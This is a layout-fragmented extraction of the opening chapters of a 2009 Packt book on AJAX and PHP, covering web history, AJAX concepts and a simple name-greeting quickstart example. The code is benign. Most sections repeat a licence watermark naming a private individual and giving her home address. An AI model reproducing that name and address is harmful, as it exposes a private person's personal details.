Larger Text,Smaller Text,Symbol
AJAX and PHP,NA,NA
Building Modern Web Applications – Second ,NA,NA
Edition,NA,NA
Build user-friendly Web 2.0 Applications with JavaScript ,NA,NA
and PHP,NA,NA
Bogdan Brinzarea-Iamandi ,NA,NA
Cristian Darie ,NA,NA
Audra Hendrix,"BIRMINGHAM - MUMBAI
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
AJAX and PHP ,"Building Modern Web Applications – Second Edition
  
 Copyright © 2009 Packt Publishing
  
 All rights reserved. No part of this book may be reproduced, stored in a retrieval 
 system, or transmitted in any form or by any means, without the prior written 
 permission of the publisher, except in the case of brief quotations embedded in 
 critical articles or reviews.
  
 Every effort has been made in the preparation of this book to ensure the accuracy of 
 the information presented. However, the information contained in this book is sold 
 without warranty, either express or implied. Neither the authors, nor Packt 
 Publishing, and its dealers and distributors will be held liable for any damages caused 
 or alleged to be caused directly or indirectly by this book.
  
 Packt Publishing has endeavored to provide trademark information about all of the 
 companies and products mentioned in this book by the appropriate use of capitals. 
  
 However, Packt Publishing cannot guarantee the accuracy of this information.
  
 First published: December 2009
  
 Production Reference: 1101209
  
 Published by Packt Publishing Ltd. 
  
 32 Lincoln Road 
  
 Olton 
  
 Birmingham, B27 6PA, UK.
  
 ISBN 978-1-847197-72-6
  
 www.packtpub.com
  
 Cover Image by Parag Kadam (
 paragvkadam@gmail.com
 )
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Credits,"Authors 
  
 Bogdan Brinzarea-Iamandi
  
 Cristian Darie 
  
 Audra Hendrix
  
 Reviewer 
  
 Kalpesh Barot
  
 Acquisition Editor 
 Douglas Paterson
  
 Development Editor 
 Dhiraj Chandiramani
  
 Technical Editor 
  
 Aanchal Kumar
  
 Indexer 
  
 Rekha Nair
  
 Editorial Team Leader 
 Gagandeep Singh
  
 Project Team Leader 
 Lata Basantani
  
 Project Coordinators 
 Srimoyee Ghoshal
  
 Rajashree Hamine
  
 Proofreader 
  
 Sandra Hopper
  
 Graphics 
  
 Nilesh Mohite
  
 Production Coordinators 
 Adline Swetha Jesuthas
  
 Dolly Dasilva
  
 Cover Work 
  
 Dolly Dasilva
  
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
About the Authors,"Bogdan Brinzarea-Iamandi
  is a software engineer having a strong background in 
 Computer Science. He holds a Master and Bachelor Degree from the Automatic Control 
 and Computers Faculty at the Politehnica University of Bucharest, Romania. 
  
 He also has an Auditor diploma from the Computer Science department at Ecole 
 Polytechnique, Paris, France.
  
 His main interests include software architecture, web technologies, distributed 
 computing, and software methodologies. Currently, he is the Software Development 
 Manager at a Romanian bank, Banca Romaneasca, a member of the National Bank of 
 Greece, where he coordinates the development and implementation of enterprise 
 software for the banking industry.
  
 He is also the author of the books 
 AJAX and PHP: Building Responsive Web Applications 
 and
  Microsoft AJAX Library Essentials: Client-side ASP.NET AJAX 1.0 Explained.
  
 Cristian Darie
  is a software engineer with experience in a wide range of modern 
 technologies, and is the author of numerous books, which are all listed on his 
 homepage at 
 http://www.cristiandarie.ro
 . Cristian is the manager and the 
 former technical architect of 
 http://www.okazii.ro
 , the largest Romanian e-
 commerce website.
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
About the Reviewer,"Kalpesh Barot
  has about five years of experience in the world of PHP. He has worked 
 extensively on small- and large-scale social networking websites developed in PHP. He 
 has been involved in varied projects, from planning and developing websites to creating 
 custom modules on big social networking websites.
  
 He received a Masters degree in Enterprise Software Engineering from University of 
 Greenwich, UK. There he learned the theory behind his computer experience and 
 became a much more efficient computer programmer.
  
 He has worked actively in the IT sector since his freshman year at the university. He 
 has been a PHP developer since then and has developed his skills in this field.
  
 Through his increasing responsibilities, he has learned to prioritize needs and wants, 
 and applies this ability to his projects. He has acted as a technical reviewer for 
 OOP with 
 PHP
  for Packt Publishing. 
  
 I would like to thank my wife, Bansari Barot, for her continued 
 support in all my projects and Rajashree Hamine for her constant 
 efforts in reminding me to review the chapters on time.
  
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Table of Contents,"Preface 
  
 1
  
 Chapter 1: The World of AJAX and PHP 
  
 7
  
 The big picture 
  
 8
  
 AJAX and Web 2.0 
  
 9
  
 Building websites since 1990 
  
 10
  
 HTTP and HTML 
  
 10
  
 PHP and other server-side technologies 
  
 11
  
 JavaScript and other client-side technologies 
  
 12
  
 What's missing? 
  
 13
  
 The world of AJAX 
  
 14
  
 What is AJAX made of? 
  
 16
  
 Uses and misuses of AJAX 
  
 17
  
 Resources and tools 
  
 19
  
 Setting up your environment 
  
 19
  
 Building a simple application with AJAX and PHP 
  
 20
  
 Summary 
  
 34
  
 Chapter 2: JavaScript and the AJAX Client 
  
 35
  
 JavaScript and the Document Object Model 
  
 36
  
 JavaScript events and the DOM 
  
 41
  
 Even more DOM 
  
 46
  
 JavaScript, DOM, and CSS 
  
 50
  
 Using the XMLHttpRequest object 
  
 54
  
 Creating the XMLHttpRequest object 
  
 55
  
 JavaScript exception handling 
  
 56
  
 Creating better objects for Internet Explorer 6 
  
 59
  
 Initiating server requests using XMLHttpRequest 
  
 60
  
 Handling server response 
  
 63
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Preface,"AJAX is a complex phenomenon that means different things to different people. 
  
 Computer users appreciate that their favorite websites are now friendlier and feel more 
 responsive. Web developers learn new skills that empower them to create sleek web 
 applications with little effort. Indeed, everything sounds good about AJAX! 
  
 At its roots, AJAX is a mix of technologies that lets you get rid of the evil page reload, 
 which represents the dead time when navigating from one page to another. Eliminating 
 page reloads is just one step away from enabling more complex features into websites, 
 such as real-time data validation, drag-and-drop, and other tasks that weren't 
 traditionally associated with web applications. Although the AJAX ingredients are 
 mature (the 
 XMLHttpRequest
  object, which is the heart of AJAX, was created by 
 Microsoft in 1999), their new role in the new wave of web trends is very young, and 
 we'll witness a number of changes before these technologies will be properly used to the 
 best benefit of the end users.
  
 AJAX isn't, of course, the answer to all the Web's problems, as the current hype around it 
 may suggest. As with any other technology, AJAX can be overused, or used the wrong 
 way. AJAX also comes with problems of its own: you need to fight with browser 
 inconsistencies, AJAX-specific pages don't work on browsers without JavaScript, they 
 can't be easily bookmarked by users, and search engines don't always know how to 
 parse them. Also, not everyone likes AJAX. While some are developing enterprise 
 architectures using JavaScript, others prefer not to use it at all. 
  
 When the hype is over, most will probably agree that the middle way is the wisest way 
 to go for most scenarios. 
  
 In 
 AJAX and PHP: Building Modern Web Applications – Second Edition
 , we take a pragmatic 
 and safe approach by teaching relevant patterns and best practices that we think any web 
 developer will need sooner or later. We teach you how to avoid the common pitfalls, how 
 to write efficient AJAX code, and how to achieve functionality that is easy to integrate into 
 current and future web applications, without requiring you to rebuild the whole solution 
 around AJAX. You'll be able to use the knowledge you learn from this book right away, in 
 your PHP web applications. 
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
What this book covers,"Chapter 1: The World of AJAX and PHP
  is all about a quick introduction to the world of 
 AJAX. In order to proceed with learning how to build AJAX applications, it's important 
 to understand why and where they are useful. It describes the 
 XMLHttpRequest
  
 object, which is the key element that enables the client-side JavaScript code to call a 
 page on the server asynchronously.
  
 Chapter 2:JavaScript and the AJAX Client
  walks you through many fields such as 
 working with HTML, JavaScript, CSS, the DOM, XML, and 
 XMLHttpRequest
 . 
  
 It discusses the theory (and practice) that you will need to know to make these 
 components come together smoothly, and form a solid foundation for your future 
 AJAX applications. It also shows you how to implement simple error-handling 
 techniques, and how to write code efficiently.
  
 Chapter 3:Object Oriented JavaScript
  covers a large area of what object-oriented 
 programming means in the world of JavaScript starting from basic features and 
 going far into the execution context of functions. It teaches you the basic OOP 
 concepts—encapsulation, polymorphism, and inheritance, how to work with 
 JavaScript objects, functions, classes, and prototypes, how to simulate private, 
 instance, and static class members in JavaScript, what the JavaScript execution 
 context is, how to implement inheritance by using constructor functions and 
 prototyping, and the basics of JSON.
  
 Chapter 4:Using PHP and MySQL on the Server
  starts putting the server to work, using 
 PHP to generate dynamic output, and MySQL to manipulate and store the backend data. 
 This chapter shows you how to use XML and JSON with PHP (so that you can create 
 server-side code that communicates with your JavaScript client), how to implement 
 error-handling code in your server-side PHP code, and how to work with MySQL 
 databases.
  
 Chapter 5:AJAX Form Validation
  creates a form validation application that 
  
 implements traditional techniques with added AJAX flavor, thereby making the form more 
 user-friendly, responsive, and pleasing. The intention of this chapter isn't to build the 
 perfect validation technique but, rather, a working proof of concept that takes care of user 
 input and ensures its validity.
  
 Chapter 6:Debugging and Profiling AJAX Applications
  teaches how to enable and use 
 Internet Explorer's debugging capabilities. It shows how you can work with Web 
 Development Helper, Developer Toolbar, and other Internet Explorer tools and with 
 Firefox plugins such as Firebug, Venkman JavaScript Debugger, and Web Developer.
  
 [
  2 
 ]
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
What you need for this book,"To go through the examples in this book you need PHP 5, a web server, and a 
 database server. We have tested the code under several environments, but mostly 
 with the Apache 2 web server, and MySQL 4.1 and MySQL 5 databases. 
  
 You can choose, however, to use another web server, or another database product, in 
 which case the procedures presented in the chapters might not be 100% accurate. It is 
 important to have PHP 5 or newer, because we use some features, such as Object 
 Oriented Programming support, which aren't available in older versions. 
  
 Please read the appendix for more details about setting up your machine. If your 
 machine already has the required software, you still need to read the final part of 
 appendix, where you are instructed about creating a database that is used for the 
 examples in this book.",NA
Who this book is for,"This book is written for PHP developers who want to learn how to use PHP, JavaScript, 
 MySQL, and jQuery to implement Web 2.0 applications, are looking for a step-by-step, 
 example-driven AJAX tutorial, want to learn advanced AJAX coding patterns and 
 techniques, and want to be able to assess the security and SEO implications of their 
 code.
  
 [
  3 
 ]
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Conventions ,"In this book, you will find a number of styles of text that distinguish between 
 different kinds of information. Here are some examples of these styles, and an 
 explanation of their meaning.
  
 Code words in text are shown as follows: ""We can include other contexts through the use 
 of the 
 include
  directive.""
  
 A block of code is set as follows: 
  
  // create the second <ui> element and add a text node to it 
 oLiOrange = document.createElement(""li"");
  
  oOrange = document.createTextNode(""Orange"");
  
  oLiOrange.appendChild(oOrange);
  
 When we wish to draw your attention to a particular part of a code block, the 
 relevant lines or items are set in bold:
  
  // create the second <ui> element and add a text node to it 
 oLiOrange = document.createElement(""li"");
  
  oOrange = document.createTextNode(""Orange"");
  
  oLiOrange.appendChild(oOrange);
  
 Any command-line input or output is written as follows:
  
 tar xvfz xampp-linux-X.Y.Z.tar.gz -C /opt
  
 New terms
  and 
 important words
  are shown in bold. Words that you see on the screen, 
 in menus or dialog boxes for example, appear in the text like this: ""Now click on the 
 Start 
 Debugging
  button. If you receive a confirmation window like that in the following 
 screenshot, click on 
 OK
 "".
  
  
 Warnings or important notes appear in a box like this.
  
  
  
 Tips and tricks appear like this.
  
  
 [
  4 
 ]
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Reader feedback,"Feedback from our readers is always welcome. Let us know what you think about this 
 book—what you liked or may have disliked. Reader feedback is important for us to 
 develop titles that you really get the most out of. 
  
 To send us general feedback, simply send an email to 
 feedback@packtpub.com
 , and 
 mention the book title via the subject of your message.
  
 If there is a book that you need and would like to see us publish, please send us 
 a note in the 
 SUGGEST A TITLE
  form on 
 www.packtpub.com
  or email 
 suggest@packtpub.com
 .
  
 If there is a topic that you have expertise in and you are interested in either writing or 
 contributing to a book on, see our author guide on 
 www.packtpub.com/authors
 .",NA
Customer support,"Now that you are the proud owner of a Packt book, we have a number of things to help 
 you to get the most from your purchase.
  
  
 Downloading the example code for the book
  
  
 Visit 
 http://www.packtpub.com/files/code/7726_Code.zip
  
 to directly download the example code.
  
 The downloadable files contain instructions on how to use them.",NA
Errata,"Although we have taken every care to ensure the accuracy of our content, mistakes do 
 happen. If you find a mistake in one of our books—maybe a mistake in the text or the 
 code—we would be grateful if you would report this to us. By doing so, you can save other 
 readers from frustration, and help us to improve subsequent versions of this book. If you 
 find any errata, please report them by visiting 
 http://www.packtpub. com/support
 , 
 selecting your book, clicking on the 
 let us know
  link, and entering the details of your 
 errata. Once your errata are verified, your submission will be accepted and the errata 
 added to any list of existing errata. Any existing errata can be viewed by selecting your 
 title from 
 http://www.packtpub.com/support
 .
  
 [
  5 
 ]",NA
Piracy,"Piracy of copyright material on the Internet is an ongoing problem across all media. At 
 Packt, we take the protection of our copyright and licenses very seriously. If you come 
 across any illegal copies of our works, in any form, on the Internet, please provide us 
 with the location address or website name immediately so that we can pursue a remedy. 
  
 Please contact us at 
 copyright@packtpub.com
  with a link to the suspected 
 pirated material.
  
 We appreciate your help in protecting our authors, and our ability to bring you 
 valuable content.",NA
Questions,"You can contact us at 
 questions@packtpub.com
  if you are having a problem with any 
 aspect of the book, and we will do our best to address it.
  
 [
  6 
 ]",NA
The World of AJAX and PHP,"""Computer, draw a robot!"" said my young cousin to the first computer he had ever seen. 
 (As I had instructed it not to listen to strangers, the computer wasn't receptive to this 
 command.) If you're like me, your first thought would be 
 how silly
  or 
 how funny
 —but 
 this is a mistake. We're being educated to accommodate computers, to compensate for 
 the lack of ability of computers to understand humans, but in an ideal world, that 
 spoken command should have been enough to have the computer please my cousin.
  
 This book doesn't aim to teach you to create software applications that 
  
 intelligently interact with children—we're still far from that point. However, we'll help 
 you take a small but important step in that direction. We'll teach you how to best use 
 web development technologies available today—AJAX and PHP in particular—to 
 enhance web users' experience with your website, by creating more usable and friendly 
 web interfaces. As far as this chapter is concerned, we'll discuss the following topics:
  
 •
  
 •
  
 •
  
 •
  
 The big picture
 : Here we'll answer a question we're often asked: 
 Why bother 
 improving our applications' user interfaces and features, when the existing ones 
 perform satisfactorily?
  
 Building websites since 1990
 : What are the fundamental principles of the Web, 
 and what are the important technologies that make it work? You probably know 
 most of this, but we hope you'll welcome this quick refresher.
  
 The world of AJAX
 : As you will learn, AJAX is a powerful tool to improve your 
 web interfaces. However, it's important to understand when you should and 
 shouldn't use it. We'll also discuss the basic principles of AJAX, and refer to online 
 resources and tools that can help you along the way.
  
 Setting up your environment
 : In this book, you'll find plenty of 
 code—and be anxious to see it in action. We've taken care of that by 
 including step-by-step instructions with every exercise.",NA
The big picture,"The story about Cristian's seven-year-old cousin (which happened back in 1990) is still 
 relevant today. The ability of technology to be user-friendly has evolved quite a bit, but 
 there's still a long way to go before we have computers that self-adapt to our needs. For 
 now, people must 
 learn
  how to work with computers—some even end up loving a black 
 screen with a tiny command prompt on it!
  
 We will be very practical and concise in this book, but before getting back to your 
 favorite mission (writing code )—it's worth taking a little step back . It's easy to forget 
 that 
 the very reason technology exists is to serve people
 , and make their lives more 
 entertaining at home and more efficient at work.
  
 The working habits of many are driven by software with intuitive (and enjoyable) user 
 interfaces. Successful companies are typically one step ahead of their 
  
 competition in offering their users more simple and natural ways to achieve their 
 goals—explaining the popularity of the mouse, features such as 
 drag-and-drop
 , and 
 that simple textbox that searches the entire Web for you in just 0.1 seconds (or so it 
 says). 
  
 Understanding the way people's brains work is one key to building the ultimate 
 software application. We know that end users need intuitive user interfaces; they don't 
 really care what operating system they're running as long as the functionality they get 
 is what they want. The art of meeting users' interface expectations, understanding the 
 nature of their work, and building software applications accordingly is referred to as 
 softwareusability.
  
 In the past, when users were specifically technically trained, the behavior of any 
 software that interacted with humans was less important. Business needs today 
 dictate that users aren't necessarily technically trained—administrative staff don't 
 usually hold degrees in Computer Science, but still need to deliver good-looking 
 reports for the sales manager, and easily create data entry forms for the sales force.
  
 [
  8 
 ]",NA
AJAX and Web 2.0,"These days, it's increasingly difficult to discuss AJAX without mentioning Web 2.0 
 (
 http://en.wikipedia.org/wiki/Web_2
 ). What is Web 2.0? Initially, Web 2.0 was 
 associated with the 
 Semantic Web
  (
 http://en.wikipedia.org/wiki/Semantic_ 
 web
 ). The Semantic Web is envisioned to be the next step in the Web's evolution, based 
 on online social-networking applications, using tag-based 
 folksonomies
  (user-generated 
 tags for data categorization). Some say it is simply a marketing buzzword without any 
 special meaning, while others use this term to describe the new, open, interactive Web 
 that facilitates online information sharing and collaboration. 
  
 Controversies aside, the version number is an allusion to the recent changes of the 
 World Wide Web. The new generation of web applications offers a richer user 
 experience, much closer to that of desktop applications, while using live data from the 
 Internet. In the world of Web 2.0, AJAX plays an essential role providing the 
 technological support to implement rich and responsive web interfaces.
  
 [
  9 
 ]",NA
Building websites since 1990,"Before getting into the details, let's take the inevitable history lesson to make sure 
 we've got our definitions straight. We promise we'll keep this 
 short
 . If you're a web 
 development veteran, feel free to skip ahead to 
 The world of AJAX
  section.
  
 Although the history of the Internet is a bit longer, 1991 is the year when 
 HyperText 
 TransferProtocol
  (
 HTTP
 ), still used to transfer data over the Internet, was invented. In 
 its initial versions, it didn't do much more than opening and closing connections. 
  
 The later versions of HTTP (Version 1.0 appeared in 1996 and Version 1.1 in 1999) 
 became the protocol that we all know and use.",NA
HTTP and HTML,"HTTP is supported by all web browsers, and it does its original job very 
  
 well—retrieving simple web content. Whenever you request a web page using your 
 favorite web browser, the HTTP protocol is assumed. So, for example, when you type 
 www.msn.com
  in the location bar of your web browser, it will assume by default that 
 you meant 
 http://www.msn.com
 .
  
 The standard document type of the Web is 
 HyperTextMarkupLanguage 
  
 (HTML
 )—a markup language that dictates a document's formatting and layout of 
 static text and images
 . When you need to get to another HTML page via HTTP, you 
 initiate a full page reload, and the HTML page you requested must already exist as a 
 static document at the mentioned location prior to the request—it only enables users 
 to retrieve static content (HTML pages) from the Internet. HTTP and HTML are still a 
 very successful pair and are the foundation of the Web as we know it today. Figure 1-1  
 shows a simple transaction when a user requests a web page from the Internet using 
 the HTTP protocol:
  
  
 user
  
 web client
  
 client requests 
  
 index.html via HTTP
  
 web server
  
 web server replies by 
 sending back the 
  
 contents of index.html
  
 Figure 1-1:  A simple HTTP request
  
 [
  10 
 ]",NA
PHP and other server-side technologies,"There are several technologies (or languages) that are supported to create the server-
 side logic (PHP, ASP.NET, Java Server Pages (JSP), Perl, ColdFusion, Ruby on Rails, and 
 others), each with their own merits and drawbacks. For our server-side implementation 
 we've chosen PHP, an open source scripting language offering a solid and widely-used 
 development platform. Instead of sending back a static page, the server executes the 
 code in the PHP page and sends back the results. 
  
 (These results must still be in the form of HTML, or in another format that the 
 client understands.) 
  
 [
  11 
 ]",NA
JavaScript and other client-side technologies,"Client-side technologies differ in many ways, beginning with the way they are 
 loaded and executed by the web client. Let's take a look at one of these 
 technologies—JavaScript.
  
 JavaScript
  is a language in its own right. Its code is written in plain text and can be 
 embedded into HTML pages to empower them. It is supported by most of the web 
 browsers without requiring users to install new components on the system and has 
 object-oriented capabilities (although perhaps differing from the OOP model(s) you are 
 familiar with already).
  
 JavaScript is a scripting language—not a compiled language—so it's not suited for 
 intensive calculations or writing device drivers, and it must arrive whole at the client to 
 be interpreted. This potential security issue doesn't make it suited for writing sensitive 
 business logic (this wouldn't be a recommended practice anyway), but it does a good job 
 when used for the right purposes.
  
 With JavaScript, developers could finally build web pages that ""did"" things 
  
 (remember the days of snow falling on a page?). With client-side form validation, users 
 no longer cause a whole page to reload if they fail to fill out the form correctly 
 (irritatingly losing all the previously typed data in the process). Despite its potential, 
 JavaScript was never used consistently to make the Web experience more user friendly 
 like desktop applications.
  
 [
  12 
 ]",NA
What's missing?,"With all these options for developing powerful features inside web browsers, why 
 would anyone want anything new? What's missing?
  
 As pointed out in the beginning of the chapter, technology exists to serve existing 
 market needs. Part of the market wants to deliver more powerful functionality to web 
 clients without using Flash, Java applets, or other technologies that are considered 
 either too flashy or heavy-weight for certain purposes. A typical example is that of 
 interactive form validation, where the data typed by the visitor must be checked against 
 some validation rules coded on the server for compliancy.
  
 For such scenarios, developers created websites and web applications using HTML, 
 JavaScript, and PHP (or another server-side technology). The typical request with this 
 scenario is shown in Figure 1-3. It shows an HTTP request, the response made up of 
 HTML, and JavaScript built programmatically with PHP.
  
  
 user
  
 web client
  
 client requests
  
 a PHP page
  
 server executes the 
 PHP page and builds 
 an HTML response
  
 response containing 
 HTML and JavaScript
  
 web server
  
 Figure 1-3: HTTP, HTML, ASP.NET, and JavaScript in action
  
 [
  13 
 ]",NA
The world of AJAX,"AJAX is an acronym for Asynchronous JavaScript and XML. The key element here is 
 Asynchronous. Simply put, AJAX offers a technique to make background server calls via 
 JavaScript and retrieve additional data as needed, updating portions of the page without 
 causing full page reloads. Figure 1-4 offers a visual representation of what happens when 
 a typical AJAX-enabled web page is requested by a visitor:
  
  
 web client
  
 client requests a
  
 PHP
  
 page
  
 server executes the 
  
 PHP page and builds 
  
 an HTML response
  
 response containing HTML 
 and JavaScript
  
 user
  
 web server
  
 javascript code makes 
 invisible call to server
  
 server replies by sending 
  
 the requested data
  
 javascript updates the 
  
 web page using this data
  
 Figure 1-4: A typical AJAX call
  
 AJAX solves the balance between the client and server by allowing them to 
 communicate in the background 
 while the user is working
  on the page.
  
 Consider web registration forms where the user is asked to enter data (such as name, 
 email address, password, credit card number, and so on) that must be validated before 
 proceeding to the next step of the registration process. There are three possible ways to 
 implement this:
  
 •
  
 Let the user type all the required data, 
 submit
  the page, and then perform the 
 validation on the server. If the validation doesn't succeed, the server sends back 
 the (sometimes empty) form, asking the visitor to correct the invalid entries. In 
 this scenario, the user experiences 
 dead time
  (a delay) between submitting and 
 waiting for response. 
  
 [
  14 
 ]",NA
What is AJAX made of?,"The technologies AJAX is made of are already implemented in all modern web 
 browsers, so the client doesn't need to install any extra modules to run an AJAX 
 website. AJAX is made up of the following:
  
 •
  
 •
  
 JavaScript
 , the essential ingredient of AJAX, allows you to build the client-
 side functionality. In the JavaScript functions, we'll use the 
  
 DocumentObjectModel
  (
 DOM
 ) to manipulate parts of the HTML page. 
  
 The 
 XMLHttpRequest
  object, the component that enables JavaScript to 
 access the server asynchronously in the background. 
  
 [
  16 
 ]",NA
Uses and misuses of AJAX,"As noted earlier, AJAX can improve your visitors' experience with your website, but it 
 can also worsen it when used inappropriately. Unless your application has really special 
 requirements, it's wise to let your users navigate your content using good old 
 hyperlinks. Web browsers have a long history of dealing with content navigation, and 
 web users have a long history of using these browsers. In the vast majority of cases, 
 AJAX is best used in addition to the traditional web development paradigms, rather than 
 changing or replacing them.
  
 [
  17 
 ]",NA
Resources and tools,"AJAX enjoys an active community and a veritable plethora of resources, guides, 
 toolkits, frameworks, forums, and tutorials. Whether you're a veteran developer 
 or working with AJAX for the first time, it's well worth your time to peruse these 
 resources. 
  
 We are listing a few places to get you started that may help you in your journey into the 
 exciting world of AJAX. Some are server-agnostic, while others are specifically created 
 for ASP.NET, Java, PHP, Coldfusion, Flash, and Perl backends. Among the most popular 
 server-agnostic toolkits are 
 Dojo
  (
 http://dojotoolkit.org
 ), 
 Prototype
  
 (
 http://prototypejs.org/
 ), script.aculo.us (
 http://script.aculo. us
 ), and 
 jQuery
  (
 http://jquery.com/
 )—which you'll be using in this book as well.
  
 For starters, here are a few useful generic AJAX resources:
  
 •
  
 •
  
 •
  
 http://www.ajaxian.com
  is the AJAX website of Ben Galbraith and Dion 
 Almaer, the authors of 
 PragmaticAjax
  (Pragmatic Bookshelf, 2006).
  
 http://ajaxpatterns.org
  is an informational website about AJAX design 
 patterns, and the home page of 
 Ajax Design Patterns
  by Michael Mahemoff 
 (O'Reilly, 2006).
  
 http://www.fiftyfoureleven.com/resources/programming/
  
 xmlhttprequest
  is a comprehensive article collection about AJAX.
  
 •
  
 •
  
 •
  
 http://www.sitepoint.com/subcat/javascript
  is Sitepoint's AJAX 
 home, featuring excellent articles.
  
 http://developer.mozilla.org/en/docs/AJAX
  is Mozilla's page on AJAX.
  
 http://en.wikipedia.org/wiki/Ajax
  is the Wikipedia page on AJAX.
  
 The list is by no means complete. If you need more online resources, search engines will 
 be of help.",NA
Setting up your environment,"Before moving on, ensure you've prepared your working environment as shown in 
 the Appendix, where you're guided through installation and setup of PHP and 
 Apache, and set up the database used for the examples in this book. (You won't need 
 a database for the first example though.)
  
 [
  19 
 ]",NA
Building a simple application with AJAX ,NA,NA
and PHP,"This exercise is for those readers willing to start coding ASAP, but it 
  
  
 assumes you're already familiar with JavaScript, PHP, and XML. If this is 
  
 not the case, or if at any time you feel this exercise is too challenging, feel 
  
 free to skip to Chapter 2. In Chapter 2 and Chapter 3, we'll have a much 
  
 closer look at the AJAX technologies and techniques and everything will 
  
 become clear.
  
 You'll create a simple AJAX web application called 
 quickstart
  where the user is 
 asked to enter his or her name and the server sends back responses as they type. 
  
 Figure 1-6 shows the initial page, 
 index.html
 , loaded by the user. (Note that 
 index.html
  gets loaded by default when requesting the 
 quickstart
  web folder, 
 even if the file name is not explicitly mentioned.)",NA
Time for action – Quickstart AJAX,"1. In the Appendix, you're instructed to set up a web server, and create a web-
 accessible folder called 
 ajax
  to host all your code for this book. Under the 
 ajax
  folder, create a new folder called 
 quickstart
 . 
  
 2. In the 
 quickstart
  folder, create a file called 
 index.html
 , and add the 
  
 following code to it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" 
 ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
  
 <html xmlns=""http://www.w3.org/1999/xhtml"">
  
  <head>
  
  <title>AJAX with PHP, 2nd Edition: Quickstart</title>
  
  <script type=""text/javascript"" src=""quickstart.js""></script>
  
  </head>
  
  <body onload='process()'>
  
  Server wants to know your name: 
  
  <input type=""text"" id=""myName"" />
  
  <div id=""divMessage"" />
  
  </body>
  
 </html>
  
 3. Create a new file called 
 quickstart.js
 , and add the following code in it:
  
 // stores the reference to the XMLHttpRequest object
  
 var xmlHttp = createXmlHttpRequestObject(); 
  
 // retrieves the XMLHttpRequest object
  
 [
  23 
 ]",NA
What just happened?,"Here comes the fun part—understanding what happens in that code. (Remember 
 that we'll discuss much more technical details over the following chapters.)
  
 It all begins with 
 index.html,
  which references a mysterious JavaScript file called 
 quickstart.js
  and builds a very simple web interface. In the following code snippet 
 from 
 index.html
 , notice the elements highlighted in bold:
  
  <body 
 onload='process()'
 >
  
  Server wants to know your name:
  
  <input type=""text"" id=""myName"" />
  
  <div id=""divMessage"" />
  
  </body>
  
 When the page loads, a function from 
 quickstart.js
  called 
 process()
  gets 
 executed. We will see how this causes the 
 <div>
  element to be populated with a 
 message from the server in a moment. 
  
 On the web server, you have a script called 
 quickstart.php
  that builds an XML 
 message to send to the client. This XML message consists of a 
 <response>
  element 
 that packages the message the server needs to send back to the client:
  
 <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> 
 <response>
  
  
  ... message the server wants to transmit to the client ...
  
 </response>
  
 If the username received from the client is empty, the message we write in the 
 <response>
  element is 
 Stranger, please tell me your name!
 . If the name is 
 Yoda
 , 
 Audra
 , 
 Bogdan
 , or 
 Cristian
 , the server responds with 
 Hello, master <name>!
 . If the 
 name is anything else, the message will be 
 <name>, I don't know you!
  So if 
 Mickey 
 Mouse
  types his name, the server will send back the following XML structure:
  
 <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> 
 <response>
  
  
  Mickey Mouse, I don't know you!
  
 </response>
  
 Let's take a quick look at how 
 quickstart.php
  generates the appropriate XML. 
 The script starts by generating the XML document header and the opening 
 <response>
  element:
  
 <?php 
  
 // we'll generate XML output 
  
 header('Content-Type: text/xml'); 
  
 // generate XML header
  
 [
  27 
 ]",NA
Summary,"This chapter was all about a quick introduction to the world of AJAX. In order to proceed 
 with learning how to build AJAX applications, it's important to understand why and where 
 they are useful. As with any other technology, AJAX isn't the answer to all problems, but it 
 offers powerful means to address some of them.
  
 AJAX combines client-side and server-side functionality to enhance the user 
 experience of your site. The 
 XMLHttpRequest
  object is the key element that enables 
 the client-side JavaScript code to call a page on the server asynchronously. This 
 chapter was intentionally short and probably has left you with many questions—that's 
 good! Be prepared for a whole book dedicated to answering questions and 
 demonstrating lots of interesting functionality!
  
 [
  34 
 ]",NA
JavaScript and the AJAX ,NA,NA
Client,"We hope that the first chapter has whetted your appetite for AJAX enough and you're 
 now ready to take on a second chapter packed with even more theory and exercises. If 
 you found the first exercise challenging, you can breathe easier—there's no better way 
 to learn than by example and we will present you with several short ones to get you on 
 your way. In this chapter, we'll be taking a longer and more detailed look at client-side 
 AJAX technologies including:
  
 •
  
 JavaScript and the JavaScript Document Object Model (DOM)
  
 •
  
 Cascading Style Sheets (CSS)
  
 •
  
 The XMLHttpRequest object
  
 •
  
 Extensible Markup Language (XML)
  
 We're going to discuss the theory (and practice) that you will need to know to make 
 these components come together smoothly and form a solid foundation for your future 
 AJAX applications. You will see how to implement simple error-handling techniques, and 
 how to write code efficiently. Chapter 3, 
 Object Oriented JavaScript
 , will complete the 
 client-side foundations by teaching Object Oriented Javascript.",NA
JavaScript and the Document Object ,NA,NA
Model,"JavaScript is the heart of AJAX. As mentioned in Chapter 1, 
 The World of AJAX and 
 PHP
 , JavaScript is a 
 parsed language
  (not compiled); it has 
 Object-Oriented 
 Programming
  (
 OOP
